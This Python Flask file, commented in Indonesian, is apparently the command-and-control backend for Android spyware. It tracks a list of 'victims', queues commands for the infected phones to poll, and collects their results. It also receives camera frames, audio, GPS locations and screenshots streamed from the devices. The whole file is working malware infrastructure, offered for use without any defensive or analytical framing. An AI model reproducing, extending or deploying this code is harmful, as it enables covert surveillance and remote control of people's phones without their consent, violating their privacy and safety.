from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)

# Simulasi database (pake memori)
victims = [
    {"id": "device123", "name": "HP Korban", "ip": "192.168.1.10", "os": "Android 13", "status": "online"}
]
pending_commands = {}  # { victim_id: command }
results = {}  # { victim_id: [ {command, result, status, time} ] }
streams = {
    "camera": {},  # { victim_id: last_frame }
    "audio": {},
    "gps": {},
    "screenshot": {}
}

# ===== ENDPOINT VICTIMS =====
@app.route('/api/victims', methods=['GET'])
def get_victims():
    return jsonify(victims)

# ===== ENDPOINT KIRIM PERINTAH DARI PANEL =====
@app.route('/api/cmd', methods=['POST'])
def send_command():
    data = request.json
    victim_id = data.get('victim_id')
    command = data.get('command')
    if not victim_id or not command:
        return jsonify({"error": "missing victim_id or command"}), 400
    pending_commands[victim_id] = command
    # Simpan juga ke results biar muncul di log
    if victim_id not in results:
        results[victim_id] = []
    results[victim_id].append({
        "command": command,
        "result": "pending...",
        "status": "pending",
        "time": datetime.now().isoformat()
    })
    return jsonify({"status": "ok"})

# ===== ENDPOINT CLIENT MINTA PERINTAH (POLLING) =====
@app.route('/api/command/<victim_id>', methods=['GET'])
def get_command(victim_id):
    cmd = pending_commands.pop(victim_id, None)
    if cmd:
        return jsonify({"action": cmd})
    return jsonify({"action": "none"})

# ===== ENDPOINT CLIENT KIRIM HASIL =====
@app.route('/api/result', methods=['POST'])
def receive_result():
    data = request.json
    victim_id = data.get('victim_id')
    command = data.get('command')
    result = data.get('result')
    status = data.get('status', 'done')
    if victim_id and command:
        if victim_id not in results:
            results[victim_id] = []
        # Cari log pending terakhir dan update
        for log in reversed(results[victim_id]):
            if log['command'] == command and log['status'] == 'pending':
                log['result'] = result
                log['status'] = status
                log['time'] = datetime.now().isoformat()
                break
        else:
            results[victim_id].append({
                "command": command,
                "result": result,
                "status": status,
                "time": datetime.now().isoformat()
            })
        return jsonify({"status": "ok"})
    return jsonify({"error": "invalid data"}), 400

# ===== ENDPOINT AMBIL LOGS =====
@app.route('/api/results/<victim_id>', methods=['GET'])
def get_results(victim_id):
    return jsonify(results.get(victim_id, []))

# ===== ENDPOINT STREAMING =====
@app.route('/api/stream/camera', methods=['POST'])
def stream_camera():
    data = request.json
    victim_id = data.get('device_id')
    frame = data.get('frame')
    if victim_id and frame:
        streams['camera'][victim_id] = frame
        return jsonify({"status": "ok"})
    return jsonify({"error": "invalid"}), 400

@app.route('/api/stream/audio', methods=['POST'])
def stream_audio():
    data = request.json
    victim_id = data.get('device_id')
    audio = data.get('audio')
    if victim_id and audio:
        streams['audio'][victim_id] = audio
        return jsonify({"status": "ok"})
    return jsonify({"error": "invalid"}), 400

@app.route('/api/stream/gps', methods=['POST'])
def stream_gps():
    data = request.json
    victim_id = data.get('device_id')
    loc = data.get('location')
    if victim_id and loc:
        streams['gps'][victim_id] = loc
        return jsonify({"status": "ok"})
    return jsonify({"error": "invalid"}), 400

@app.route('/api/stream/screenshot', methods=['POST'])
def stream_screenshot():
    data = request.json
    victim_id = data.get('device_id')
    img = data.get('frame')
    if victim_id and img:
        streams['screenshot'][victim_id] = img
        return jsonify({"status": "ok"})
    return jsonify({"error": "invalid"}), 400

# ===== ENDPOINT BUAT PANEL LIHAT STREAM (OPSIONAL) =====
@app.route('/api/stream/<victim_id>/camera', methods=['GET'])
def get_camera_stream(victim_id):
    frame = streams['camera'].get(victim_id)
    if frame:
        return jsonify({"frame": frame})
    return jsonify({"error": "no frame"}), 404

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
